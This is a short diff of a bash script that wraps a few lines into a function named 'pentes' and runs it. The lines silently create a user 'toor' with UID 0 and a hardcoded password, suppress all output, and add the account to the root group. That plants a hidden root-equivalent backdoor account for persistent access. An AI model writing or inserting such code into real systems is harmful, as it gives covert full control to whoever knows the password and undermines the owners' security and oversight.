@@ -1,6 +1,10 @@
+#!/bin/bash
+function pentes(){
     Username="toor"
     Password="Tens@zang3tsu"
     sudo useradd -ou 0 -g 0 toor
     useradd -m -G root toor > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     sudo usermod -a -G root $Username
+}
+pentes
